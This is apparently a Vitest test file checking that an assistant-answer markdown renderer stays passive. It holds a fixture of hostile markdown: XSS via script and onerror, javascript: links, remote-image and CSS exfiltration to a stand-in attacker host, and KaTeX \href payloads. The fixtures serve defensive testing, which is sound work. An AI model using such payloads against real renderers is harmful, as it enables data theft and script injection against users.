// @vitest-environment jsdom
import { act, createElement } from 'react'
import { createRoot } from 'react-dom/client'
import { renderToStaticMarkup } from 'react-dom/server'
import { describe, expect, it } from 'vitest'
import { PassiveAssistantMarkdown } from './PassiveAssistantMarkdown'
import { AssistantMarkdown } from './AssistantMarkdown'
import { chatBlockFromItem } from '../../agent/kun-mapper-events'

const formatted = [
  '# Paper summary', '', 'A **strong** claim with *emphasis* and ~~revision~~.', '',
  '1. First finding', '   - Supporting evidence', '     - Nested detail', '2. Second finding', '',
  '- [x] Reviewed', '- [ ] Unverified', '', '> A bounded quotation', '',
  '| Evidence | Score |', '| :--- | ---: |', '| Measured | 3 |', '',
  '```typescript', 'const sample = "<!-- preserved -->"', '```', '',
  'Inline `<!-- literal -->` and prices $5 and $10.', '',
  '$$\\frac{a}{b}$$', '', '$$', '\\int_0^1 x^2 dx', '$$', '',
  '#### Limits', 'No broader evidence was provided.'
].join('\n')
const hostile = [
  '# Readable answer', '',
  '![private](https://attacker.invalid/pixel?secret=paper)',
  '![local](file:///private/source) ![data](data:image/svg+xml,attack)',
  '[Remote](https://attacker.invalid) [File](deepseek-file:///private/source) [JS](javascript:alert(1))',
  '<https://attacker.invalid/auto>', '',
  '<img src="https://attacker.invalid/raw" onerror="window.__markdownXss=1">',
  '<iframe src="https://attacker.invalid/frame"></iframe><script>window.__markdownXss=1</script>',
  '<style>body{background:url(https://attacker.invalid/css)}</style>',
  '<svg><foreignObject><img src="https://attacker.invalid/svg"></foreignObject></svg>', '',
  '$$\\includegraphics{https://attacker.invalid/math}$$',
  '$$\\href{https://attacker.invalid/math-link}{remote}$$',
  '$$\\href{javascript:alert(1)}{unsafe}$$',
  '$$\\htmlStyle{background:url(https://attacker.invalid)}{unsafe}$$', '',
  '```mermaid', 'graph LR; secret --> remote', '```', '',
  '```chart', '{"url":"https://attacker.invalid/chart"}', '```', '',
  '```html', '<img src="https://attacker.invalid/code">', '```'
].join('\n')

function render(text: string): HTMLDivElement {
  const container = document.createElement('div')
  container.innerHTML = renderToStaticMarkup(createElement(PassiveAssistantMarkdown, { text }))
  return container
}

function expectPassive(container: HTMLDivElement): void {
  expect(container.querySelector('a,img,iframe,object,embed,script,style,link,button,form,video,audio,source,foreignObject')).toBeNull()
  for (const element of container.querySelectorAll('*')) {
    for (const attribute of element.attributes) {
      expect(attribute.name).not.toMatch(/^on|^(?:href|src|srcset|poster|xlink:href)$/i)
      expect(attribute.value).not.toMatch(/url\s*\(/i)
    }
  }
}

describe('passive paper answer Markdown', () => {
  it('renders structure and local math while preserving fenced/inline source and currency', () => {
    const container = render(formatted)
    expect(container.querySelector('h1')?.textContent).toBe('Paper summary')
    expect(container.querySelectorAll('ol > li').length).toBe(2)
    expect(container.querySelector('ol ul ul li')?.textContent).toBe('Nested detail')
    expect(container.querySelectorAll('input[type="checkbox"][disabled]').length).toBe(2)
    expect(container.querySelector('input[checked]')).not.toBeNull()
    expect(container.querySelector('blockquote')?.textContent).toContain('bounded quotation')
    expect(container.querySelector('table tbody td')?.textContent).toBe('Measured')
    expect(container.querySelector('pre code')?.textContent).toContain('<!-- preserved -->')
    expect(container.textContent).toContain('<!-- literal -->')
    expect(container.textContent).toContain('prices $5 and $10')
    expect(container.querySelectorAll('.katex').length).toBe(2)
    expect(container.querySelector('h4')?.textContent).toBe('Limits')
    expectPassive(container)
  })

  it('never turns source-controlled resources into elements or app actions', () => {
    const container = render(hostile)
    expect(container.querySelector('h1')?.textContent).toBe('Readable answer')
    expect(container.textContent).toContain('private')
    expect(container.textContent).toContain('Remote')
    expect(container.querySelectorAll('pre code').length).toBe(3)
    expect(container.querySelector('.katex-error, .katex')).not.toBeNull()
    expectPassive(container)
  })

  it('preserves the policy for partial, completed, replaced and resumed item text', async () => {
    ;(globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true
    const container = document.createElement('div'), root = createRoot(container)
    try {
      for (const text of ['# Partial\n\n![unfinished](https://attacker.invalid/', hostile, formatted, '# Replaced']) {
        const block = chatBlockFromItem({ id: 'answer', kind: 'assistant_text', role: 'assistant',
          threadId: 'paper', turnId: 'turn', status: 'running', createdAt: '', renderMode: 'safe-markdown', text })
        expect(block?.renderMode).toBe('safe-markdown')
        await act(async () => root.render(createElement(AssistantMarkdown, {
          text, streaming: true, safeMarkdown: block?.renderMode === 'safe-markdown', hideHtmlComments: true
        })))
        expectPassive(container)
      }
      expect(container.querySelector('h1')?.textContent).toBe('Replaced')
      expect(container.querySelector('table')).toBeNull()
    } finally { await act(async () => root.unmount()) }
  })
})
